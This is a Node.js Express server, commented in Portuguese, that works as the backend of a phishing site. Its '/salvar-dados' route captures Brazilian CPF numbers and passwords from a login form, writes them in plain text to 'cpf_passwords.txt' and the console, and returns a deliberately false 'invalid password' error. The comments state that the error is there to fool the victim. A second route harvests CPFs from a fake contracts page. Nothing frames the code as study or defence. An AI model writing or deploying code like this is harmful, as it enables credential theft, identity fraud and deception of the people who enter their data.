// 1. Importar bibliotecas
const express = require('express');
const cors = require('cors');
const fs = require('fs'); // fs = File System, para manipular arquivos
const path = require('path'); // Módulo 'path' para lidar com caminhos de arquivos

// 2. Configurações
const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

// 3. Middlewares
app.use(cors()); // Permite a comunicação entre domínios diferentes (útil para desenvolvimento)
app.use(express.json()); // Permite que o servidor leia o JSON enviado no corpo da requisição

// --- NOVA CONFIGURAÇÃO ADICIONADA ---
// Configura o Express para servir arquivos estáticos da pasta 'public'
// Isso resolve o erro "Cannot GET /" ao servir o arquivo 'index.html' que estiver nessa pasta.
app.use(express.static(path.join(__dirname, 'public')));
// ------------------------------------

// 4. Rotas da API

// Rota para capturar os dados da página de login
app.post('/salvar-dados', (req, res) => {
    // Pega o cpf e a senha enviados pelo frontend
    const { cpf, senha } = req.body;

    // Verifica se os dados foram enviados
    if (!cpf || !senha) {
        // Se não vieram dados, retorna um erro "Bad Request"
        return res.status(400).json({ message: "Dados incompletos." });
    }

    // Formata a linha que será salva no arquivo
    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;

    // Exibe no console do servidor o que foi capturado (como você pediu)
    console.log('Dados recebidos:', linhaDeLog.trim());

    // fs.appendFile adiciona a linha ao final do arquivo. Se o arquivo não existir, ele o cria.
    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            // Mesmo que dê erro ao salvar, respondemos com uma mensagem genérica
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
    });

    // Responde ao frontend com uma mensagem de erro FALSO.
    // Isso faz o usuário pensar que apenas errou a senha.
    res.status(401).json({ message: 'CPF ou senha inválidos. Tente novamente.' });
});

// Rota para capturar os dados da página de contratos
app.post('/acessar-contratos', (req, res) => {
    // Pega o cpf enviado pelo frontend
    const { cpf } = req.body;

    if (!cpf) {
        return res.status(400).json({ message: "CPF é obrigatório." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    // Formata o log para identificar que veio da página de Contratos
    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;

    // Exibe no console do servidor o que foi capturado (como você pediu)
    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());

    // Salva no mesmo arquivo de log
    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
        console.log('CPF de Contratos salvo com sucesso em', NOME_ARQUIVO_LOG);
    });

    // Responde ao frontend com uma mensagem de sucesso para o usuário.
    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
});


// 5. Inicia o servidor
app.listen(port, () => {
    console.log(`Servidor funcional rodando em http://localhost:${port}`);
    console.log(`Acesse o site no seu navegador para interagir.`);
    console.log(`Aguardando dados... tudo será mandado para o arquivo: "${NOME_ARQUIVO_LOG}" e exibido neste console.`);
});
